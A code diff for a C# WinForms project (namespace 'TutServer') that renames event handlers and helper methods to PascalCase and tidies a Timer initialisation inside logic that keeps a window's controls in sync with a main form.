         {
             Control ctl = sender as Control; //Get the caller control
 
@@ -5887,7 +6042,7 @@ namespace TutServer //Main Namespace
         /// </summary>
         /// <param name="name">The name of the control to check</param>
         /// <returns>True if the control has a setvalue directive, otherwise false</returns>
-        private bool getignoreState(String name)
+        private bool GetignoreState(String name)
         {
             bool isIgnore = false; //Declare the ignore flag
 
@@ -5908,7 +6063,7 @@ namespace TutServer //Main Namespace
         /// </summary>
         /// <param name="sender">The sender of the event</param>
         /// <param name="e">The event args</param>
-        private void onCheck(object sender, EventArgs e)
+        private void OnCheck(object sender, EventArgs e)
         {
             CheckBox cb = sender as CheckBox; //Cast the caller to a checkBox
             bool check = cb.Checked; //Get the checked stated
@@ -5921,7 +6076,7 @@ namespace TutServer //Main Namespace
         /// </summary>
         /// <param name="sender">The sender of the event</param>
         /// <param name="e">The event args</param>
-        private void onTextChange(object sender, EventArgs e)
+        private void OnTextChange(object sender, EventArgs e)
         {
             Control t = sender as Control; //Cast the caller to a control
             String name = t.Name; //Get the name of the caller
@@ -5935,7 +6090,7 @@ namespace TutServer //Main Namespace
         /// </summary>
         /// <param name="sender">The sender of the event</param>
         /// <param name="e">The event args</param>
-        private void onIndexChange(object sender, EventArgs e)
+        private void OnIndexChange(object sender, EventArgs e)
         {
             Console.WriteLine("index changed"); //Debug Function
             //if (Form1.protectLv) return;
@@ -5967,7 +6122,7 @@ namespace TutServer //Main Namespace
         /// </summary>
         /// <param name="sender">The sender of the event</param>
         /// <param name="e">The event args</param>
-        private void onClick(object sender, EventArgs e)
+        private void OnClick(object sender, EventArgs e)
         {
             try //Try
             {
@@ -5979,9 +6134,11 @@ namespace TutServer //Main Namespace
                 TabPage backup = Form1.selected; //Get the seleczed tabPage
                 Form1.setPagebackup = backup; //Store the selected tabPage
                 Form1.setvalue.Add("tabControl1§" + page.Name.Replace("tabPage", "")); //Update the setvalue instructions
-                Timer t = new Timer(); //Create a new timer
-                t.Interval = 200; //Set the frequency to 200 ms
-                t.Tick += new EventHandler(waitForTabChange); //Set the tick event handler
+                Timer t = new Timer
+                {
+                    Interval = 200 //Set the frequency to 200 ms
+                }; //Create a new timer
+                t.Tick += new EventHandler(WaitForTabChange); //Set the tick event handler
                 Form1.rbutton = remoteButton; //Store the remote button to click
                 t.Start(); //Start the timer
             }
@@ -5993,7 +6150,7 @@ namespace TutServer //Main Namespace
                 //MessageBox.Show(send.Name);
                 Form1 parent = new Form1(); //Create a new Form1 object
                 
-                parent.executeToolStrip(send.Name); //Execute the toolStrip
+                parent.ExecuteToolStrip(send.Name); //Execute the toolStrip
             }
         }
 
@@ -6002,7 +6159,7 @@ namespace TutServer //Main Namespace
         /// </summary>
         /// <param name="sender">The sender of the event</param>
         /// <param name="e">The event args</param>
-        private void waitForTabChange(object sender, EventArgs e)
+        private void WaitForTabChange(object sender, EventArgs e)
         {
             if (Form1.setFocusBack == 1) //If set focus back is in mode 1
             {
@@ -6036,23 +6193,23 @@ namespace TutServer //Main Namespace
         /// </summary>
         /// <param name="sender">The sender of the event</param>
         /// <param name="e">The event args</param>
-        private void updateUI(object sender, EventArgs e)
+        private void UpdateUI(object sender, EventArgs e)
         {
             Control.ControlCollection controls = currentRoute.Controls; //Get every control in the window
 
             foreach (Control c in controls) //Go through the controls
             {
                 String name = c.Name; //Get the control's name
-                String type = getControlType(name); //Get the control's type
+                String type = GetControlType(name); //Get the control's type
                 if (type == "") continue; //If invalid type then skip the control
-                if (getignoreState(name)) continue; //if we ignore the element, then continue
+                if (GetignoreState(name)) continue; //if we ignore the element, then continue
                 switch (type) //Switch the type
                 {
                     case "label": //if control is a label
 
                         Label l = (Label)c; //Cast the control to a label
                         String lc = l.Text; //Get the text
-                        String lv = Form1.getValue(l.Name); //Get the text of the main form's label
+                        String lv = Form1.GetValue(l.Name); //Get the text of the main form's label
 
                         if (lv != lc) //If the texts doesn't match
                         {
@@ -6065,7 +6222,7 @@ namespace TutServer //Main Namespace
 
                         Button b = (Button)c; //Cast the control to a button
                         String bc = b.Text; //Get the button text
-                        String bv = Form1.getValue(b.Name); //Get the button's text on the main form
+                        String bv = Form1.GetValue(b.Name); //Get the button's text on the main form
 
                         if (bv != bc) //If the texts doesn't match
                         {
@@ -6078,7 +6235,7 @@ namespace TutServer //Main Namespace
 
                         ComboBox cb = (ComboBox)c; //Cast the control to a combobox
                         String iname = cb.SelectedItem.ToString(); //Get the selected item
-                        String vname = new Form1().getSelectedItem(cb.Name); //Get the combobox's selected item on the main form
+                        String vname = new Form1().GetSelectedItem(cb.Name); //Get the combobox's selected item on the main form
                         if (iname != vname && !cb.DroppedDown) //If the names doesn't match and combobox is not in dropdown mode
                         {
                             cb.SelectedItem = vname; //Set the selected items to the from's selected item
@@ -6090,7 +6247,7 @@ namespace TutServer //Main Namespace
 
                         RichTextBox rtb = (RichTextBox)c; //Cast the control to a richTextBox
                         String rtbc = rtb.Text; //Get the text
-                        String rtbv = Form1.getValue(rtb.Name); //Get the text of the main form's richTextBox
+                        String rtbv = Form1.GetValue(rtb.Name); //Get the text of the main form's richTextBox
 
                         if (rtbv != rtbc) //If the texts doesn't match
                         {
@@ -6104,7 +6261,7 @@ namespace TutServer //Main Namespace
 
                         TextBox tb = (TextBox)c; //Cast the control to a textBox
                         String tbc = tb.Text; //Get the text
-                        String tbv = Form1.getValue(tb.Name); //Get the text of the form's textBox
+                        String tbv = Form1.GetValue(tb.Name); //Get the text of the form's textBox
 
                         if (tbv != tbc) //If the texts doesn't match
                         {
@@ -6148,7 +6305,7 @@ namespace TutServer //Main Namespace
                             myItems.Add(emt); //add the item to the items list
                         }
 
-                        String[] ritems = new Form1().getItems(liv.Name, "items"); //Get the items of the main form's listView
+                        String[] ritems = new Form1().GetItems(liv.Name, "items"); //Get the items of the main form's listView
                         bool editItems = false; //Declare editItems flag
 
                         if (myItems.Count == ritems.Length) //If items count match
@@ -6197,7 +6354,7 @@ namespace TutServer //Main Namespace
                             }
                         }
                         
-                        String selected = new Form1().getItems(liv.Name, "selected")[0]; //Get the seleczed item on the main form's listView
+                        String selected = new Form1().GetItems(liv.Name, "selected")[0]; //Get the seleczed item on the main form's listView
                         if (selected != "-1" && !Form1.protectLv) //If an item is selected and the listView is not protected
                         {
                             //Form1.rwriteLv = 1;
@@ -6223,7 +6380,7 @@ namespace TutServer //Main Namespace
 
                         CheckBox cx = (CheckBox)c; //Cast the control to a checkBox
                         bool xbc = cx.Checked; //Get the checked state
-                        bool xbv = new Form1().getChecked(cx.Name); //Get the main form's checkBox's checked state
+                        bool xbv = new Form1().GetChecked(cx.Name); //Get the main form's checkBox's checked state
 
                         if (xbv != xbc) //If the states mismatch
                         {
@@ -6242,7 +6399,7 @@ namespace TutServer //Main Namespace
         /// </summary>
         /// <param name="name">The name of the control to get the type of</param>
         /// <returns>The type of the control</returns>
-        private String getControlType(String name)
+        private String GetControlType(String name)
         {
             String type = ""; //Declare the type of the control
 
